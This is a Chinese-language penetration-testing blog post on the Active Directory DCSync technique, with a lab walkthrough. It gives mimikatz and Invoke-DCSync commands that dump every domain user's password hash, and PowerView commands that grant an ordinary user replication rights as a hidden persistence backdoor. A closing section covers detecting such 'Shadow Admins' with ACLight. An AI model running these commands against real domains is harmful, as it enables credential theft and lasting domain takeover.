# 域渗透-DCsync


## 0x1 概念

在域中，不同的DC之间，每隔15分钟会进行一次域数据的同步。当一个DC（辅助DC）想从其他DC（主DC）获取数据时，辅助DC会向主DC发起一个GetNCChanges请求。请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用的这个原理，通过Directory Replication Service(DRS)服务的GetNCChanges接口向域控发起数据同步请求。

在DCSync功能出现之前，要想获得域用户的哈希，需要登录域控制器，在域控制器上执行代码才能获得域用户的哈希。2015年8月，新版的mimikatz增加了DCSync的功能，该功能可以模仿一个域控DC，从真实的域控中请求数据，如用户的哈希。该功能最大的特点就是可以实现不登录到域控而获取域控上的数据。

## 0x2 利用条件

所需权限：

- 复制目录更改
- 复制目录全部更改
- 在筛选集中复制目录更改(非必要)

默认拥有上述权限的用户如下

```txt
Administrators组内的用户
Domain Admins组内的用户
Enterprise Admins组内的用户
域控制器的计算机账户(Administrator和system)
```

**DCSync 攻击的对象如果是只读域控制器 (RODC)，则会失效，因为 RODC 是不能参与复制同步数据到其他 DC 的**

## 0x3 利用方法

#### 1.使用mimikatz

切换到debug权限

```shell
log
privilege::debug
```

导出域内所有用户的hash：

```shell
lsadump::dcsync /domain:xr.com /all /csv
```

导出域内administrator帐户的hash：

```shell
lsadump::dcsync /domain:xr.com /user:administrator /csv
```

下面开始实验使用Domain Admins内用户zs，登录到域内主机上，使用mimikatz来读取hash

<img src="https://s1.vika.cn/space/2023/08/17/5203bcc5cdf941a2aa8c2842fef53d29" style="zoom:;" />

<img src="https://s1.vika.cn/space/2023/08/17/32ecae7cc96e4a49adaf116c6336e68d" alt="image-20230817144449104" style="zoom:;" />

#### 2.powershell实现

通过Invoke-ReflectivePEinjection调用mimikatz.dll中的dcsync功能

{{< link "https://gist.github.com/monoxgas/9d238accd969550136db" "Invoke-DCSync.ps1" "" true >}}

导出域内所有用户的hash：

```shell
Invoke-DCSync -DumpForest | ft -wrap -autosize
```

<img src="https://s1.vika.cn/space/2023/08/17/ec8199572b8e442d9279a188291409c8" alt="image-20230817151206787" style="zoom:;" />

导出域内administrator帐户的hash：

```shell
Invoke-DCSync -DumpForest -Users @("administrator") | ft -wrap -autosize
```

<img src="https://s1.vika.cn/space/2023/08/17/049f9632d4014e7db1e0beab8205d431" alt="image-20230817151237335" style="zoom:;" />

## 0x4 DCSync在域内维持权限

**利用条件：**

获得以下任一用户的权限：

- Domain Admins组内的用户
- Enterprise Admins组内的用户

**利用原理：**

向域内的一个普通用户添加如下三条ACE(Access Control Entries)：

- DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
- DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
- DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c)

该用户即可获得利用DCSync导出域内所有用户hash的权限

**利用方法：**

{{< link "https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L8270" "PowerView.ps1" "" true >}}

添加ACE的命令：

```shell
Add-DomainObjectAcl -TargetIdentity "DC=xr,DC=com" -PrincipalIdentity liu -Rights DCSync -Verbose
```

删除ACE的命令：

```shell
Remove-DomainObjectAcl -TargetIdentity "DC=xr,DC=com" -PrincipalIdentity liu -Rights DCSync -Verbose
```

开始实验，我们在一台域内主机登录liu普通域用户，使用mimikatz导出hash，失败

<img src="https://s1.vika.cn/space/2023/08/17/36a4c0ee63204da0880453706214153a" alt="image-20230817230857468" />

在另一台域内主机登录Domain Admins内用户zs，执行ps1，成功添加

<img src="https://s1.vika.cn/space/2023/08/17/cd8e8efefbcc43f0b954dabdb605a6cc" alt="image-20230817231012951" />

回到liu这台主机，再次导出hash，成功导出数据

<img src="https://s1.vika.cn/space/2023/08/17/6819fc1160904fb58a26449085f974b7" alt="image-20230817231041072" />

## 0x5 检测DCSync后门

具有高权限但不在高权限组的用户被称之为Shadow Admin，例如0x03中的域用户test1，仅通过查询高权限组的成员无法发现域内的Shadow Admin

**检测原理：**

枚举Active Directory中所有用户的ACL，标记出特权帐户

**利用条件：**

{{< link "https://github.com/cyberark/ACLight" "ACLight" "" true >}}

- Powershell v3.0
- 域内普通用户权限

<img src="https://s1.vika.cn/space/2023/08/17/78e80b418811489f92fda29885b4a118" alt="image-20230817232541260" style="zoom:;" />

要求Powershell v3.0，增加一台win10来执行Execute-ACLight2.bat,登录域内普通用户ls

<img src="https://s1.vika.cn/space/2023/08/17/b29b783c8641417fb1d0a6c75bf9c82d" alt="image-20230817234713769" style="zoom:;" />

生成result文件夹查看结果，排查到liu用户为Shadow Admin

<img src="https://s1.vika.cn/space/2023/08/17/fc78e9bc6ea0418694510649d32eef7b" alt="image-20230817234857099" />


---

> 作者: [xunruo](https://xunruo.top)  
> URL: https://xunruo.top/post/2d099117/  

